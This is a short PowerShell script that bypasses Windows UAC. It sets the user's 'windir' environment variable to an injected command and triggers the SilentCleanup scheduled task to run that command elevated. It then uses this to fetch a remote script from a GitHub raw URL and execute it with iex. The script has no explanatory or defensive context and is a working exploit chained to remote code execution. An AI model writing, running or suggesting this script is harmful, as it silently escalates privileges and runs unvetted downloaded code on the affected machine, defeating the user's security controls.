function sudo {
  $command = "powershell -noexit " + $args + ";#";

  Set-ItemProperty -Path "HKCU:\Environment" -Name "windir" -Value $command ;
  schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I;
  Remove-ItemProperty -Path "HKCU:\Environment" -Name "windir"
}

sudo "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/eulersdisk/system_security/main/script.ps1')"
